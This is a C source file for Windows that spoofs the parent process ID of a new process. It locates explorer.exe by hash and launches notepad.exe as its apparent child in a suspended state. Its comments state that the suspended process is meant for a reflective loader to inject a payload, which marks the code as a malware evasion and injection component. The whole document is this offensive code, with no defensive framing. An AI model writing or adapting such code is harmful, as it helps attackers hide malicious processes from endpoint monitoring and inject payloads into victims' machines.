#include <windows.h>
#include <tlhelp32.h>

// structure for syscall (concept)
typedef NTSTATUS(NTAPI *pNtCreateUserProcess)(
    PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PPS_ATTRIBUTE_LIST AttributeList, PPS_BUFFERS Buffers);

// function to spawn a process with spoofed ppid
BOOL SpawnSpoofedProcess(const char *processPath, DWORD parentPid, PROCESS_INFORMATION *pi)
{
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParent)
        return FALSE;

    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &size))
    {
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        return FALSE;
    }

    // apply the parent process attribute
    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = attrList;

    // spawn in suspended state for injection
    BOOL success = CreateProcessA(
        NULL, (LPSTR)processPath, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL, &si.StartupInfo, pi);

    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    return success;
}

// usage example
void InitializeTargetProcess()
{
    DWORD explorerPid = FindProcessByHash(0xe2304918); // using our custom hash function
    PROCESS_INFORMATION pi = {0};

    if (SpawnSpoofedProcess("C:\\Windows\\System32\\notepad.exe", explorerPid, &pi))
    {
        // at this point, the process is suspended and spoofed.
        // here you would call your reflective loader to inject your payload
        // into pi.hProcess and then resume the thread.
        // ResumeThread(pi.hThread);
    }
}
